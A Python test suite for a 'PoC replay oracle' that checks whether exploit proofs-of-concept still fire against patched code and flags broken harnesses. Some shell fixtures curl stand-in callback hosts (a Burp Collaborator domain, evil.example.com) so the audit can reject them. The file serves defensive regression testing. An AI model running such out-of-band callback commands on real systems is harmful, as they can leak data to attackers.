#!/usr/bin/env python3
"""Assertions for the PoC replay oracle. python3 test_poc_replay.py

The property under test is invariant 7: a PoC that does not fire must NEVER be
read as "fixed" unless the positive control proves the harness still works.
Fixtures are trivial trees + shell PoCs so the suite stays fast; the same four
states are demonstrated against the real Express target in EXPERIMENTS.md."""
import os, sys, stat, tempfile, importlib.util
from pathlib import Path

HERE = os.path.dirname(os.path.abspath(__file__))
spec = importlib.util.spec_from_file_location("pr", os.path.join(HERE, "poc-replay.py"))
P = importlib.util.module_from_spec(spec); spec.loader.exec_module(P)

def _tree(root, name, marker):
    d = os.path.join(root, name); os.makedirs(d, exist_ok=True)
    open(os.path.join(d, "app.txt"), "w").write(marker)
    return d

def _poc(root, name, body):
    p = os.path.join(root, name); open(p, "w").write(body)
    os.chmod(p, 0o755); return p

# fires only when app.txt contains VULNERABLE
POC = '#!/bin/bash\ngrep -q VULNERABLE app.txt && { echo "EXPLOIT SUCCESSFUL"; exit 0; }\necho "EXPLOIT FAILED"; exit 1\n'

def t_regression_when_exploit_still_fires():
    with tempfile.TemporaryDirectory() as t:
        vuln=_tree(t,"vuln","VULNERABLE"); poc=_poc(t,"e.sh",POC)
        r=P.check(poc, vuln, vuln, timeout=30)
        assert r["verdict"]=="REGRESSION" and r["trustworthy"], r

def t_fixed_only_when_control_fires():
    with tempfile.TemporaryDirectory() as t:
        vuln=_tree(t,"vuln","VULNERABLE"); fixed=_tree(t,"fixed","PATCHED")
        poc=_poc(t,"e.sh",POC)
        r=P.check(poc, fixed, vuln, timeout=30)
        assert r["verdict"]=="FIXED" and r["trustworthy"], r

def t_harness_rot_is_not_reported_as_fixed():
    """THE invariant. A PoC that cannot fire anywhere must not clear the gate."""
    with tempfile.TemporaryDirectory() as t:
        vuln=_tree(t,"vuln","VULNERABLE"); fixed=_tree(t,"fixed","PATCHED")
        rotted=_poc(t,"rot.sh",'#!/bin/bash\ngrep -q NEVER_MATCHES app.txt && exit 0\nexit 1\n')
        r=P.check(rotted, fixed, vuln, timeout=30)
        assert r["verdict"]=="HARNESS_BROKEN", r
        assert r["trustworthy"] is False           # a gate must not act on it
        assert r["verdict"]!="FIXED"

def t_out_of_band_poc_refused():
    with tempfile.TemporaryDirectory() as t:
        vuln=_tree(t,"vuln","VULNERABLE"); fixed=_tree(t,"fixed","PATCHED")
        oob=_poc(t,"oob.sh",'#!/bin/bash\ncurl -s https://abc.burpcollaborator.net/x\nexit 1\n')
        r=P.check(oob, fixed, vuln, timeout=30)
        assert r["verdict"]=="UNTRUSTED_POC" and not r["trustworthy"], r

def t_external_host_flagged_by_audit():
    with tempfile.TemporaryDirectory() as t:
        a=P.audit_poc(_poc(t,"x.sh",'#!/bin/bash\ncurl https://evil.example.com/cb\n'))
        assert not a["oracle_safe"] and a["external_hosts"]
        b=P.audit_poc(_poc(t,"y.sh",'#!/bin/bash\ncurl http://127.0.0.1:3000/api\n'))
        assert b["oracle_safe"], b                 # localhost is fine

def t_replay_error_is_not_fixed():
    with tempfile.TemporaryDirectory() as t:
        vuln=_tree(t,"vuln","VULNERABLE"); poc=_poc(t,"e.sh",POC)
        r=P.check(poc, os.path.join(t,"does-not-exist"), vuln, timeout=30)
        assert r["verdict"]=="REPLAY_ERROR" and not r["trustworthy"], r

def t_replay_isolates_state():
    """Exploits mutate state; each replay must get a fresh copy of the tree."""
    with tempfile.TemporaryDirectory() as t:
        vuln=_tree(t,"vuln","VULNERABLE")
        mutate=_poc(t,"m.sh",'#!/bin/bash\necho PATCHED > app.txt\nexit 0\n')
        P.replay(mutate, vuln, timeout=30)
        assert open(os.path.join(vuln,"app.txt")).read().strip()=="VULNERABLE"

def t_timeout_is_error_not_negative():
    with tempfile.TemporaryDirectory() as t:
        vuln=_tree(t,"vuln","VULNERABLE")
        slow=_poc(t,"s.sh",'#!/bin/bash\nsleep 20\n')
        out,ev=P.replay(slow, vuln, timeout=2)
        assert out==P.ERROR and "timeout" in ev["reason"]


def t_pinned_bundle_is_inadmissible():
    """A PoC whose HELPER hardcodes an absolute tree path always exercises that
    tree, so a fixed candidate still reports EXPLOIT SUCCESSFUL -- and the positive
    control agrees, because both replays boot the same pinned tree."""
    with tempfile.TemporaryDirectory() as d:
        Path(d, "exploit.sh").write_text("#!/usr/bin/env bash\nnode runner.js\n")
        Path(d, "runner.js").write_text("require('/tmp/vt1/src/app.js');\napp.listen(3210)\n")
        a = P.audit_bundle(str(Path(d, "exploit.sh")))
        assert a["pinned_paths"], "failed to spot the pinned helper"
        assert not a["admissible"]


def t_non_self_booting_tier1_is_inadmissible():
    """Its verdict is decided by whatever happens to be listening, not by the code."""
    with tempfile.TemporaryDirectory() as d:
        Path(d, "exploit.sh").write_text(
            "#!/usr/bin/env bash\nnode -e \"fetch('http://localhost:3240/x')\"\n")
        a = P.audit_bundle(str(Path(d, "exploit.sh")))
        assert a["tier"] >= 1 and not a["self_booting"]
        assert not a["admissible"]
        assert 3240 in a["expects_ports"]


def t_unreachable_target_is_setup_failed_not_fixed():
    """ECONNREFUSED means the PoC never ran. Recording that as 'fixed' is how a
    live vulnerability gets marked remediated (invariant 6)."""
    with tempfile.TemporaryDirectory() as d:
        tree = Path(d, "tree"); tree.mkdir()
        poc = Path(d, "p.sh")
        poc.write_text("#!/usr/bin/env bash\necho 'AggregateError [ECONNREFUSED]' >&2\nexit 1\n")
        out, ev = P.replay(str(poc), str(tree), timeout=30)
        assert out == P.SETUP_FAILED, (out, ev)

if __name__=="__main__":
    tests=[v for k,v in sorted(globals().items()) if k.startswith("t_")]
    p=0
    for t in tests:
        try: t(); print(f"PASS  {t.__name__}"); p+=1
        except AssertionError as e: print(f"FAIL  {t.__name__}: {e}")
        except Exception as e: print(f"ER*R  {t.__name__}: {e}")
    print(f"\n{p}/{len(tests)} passed"); sys.exit(0 if p==len(tests) else 1)
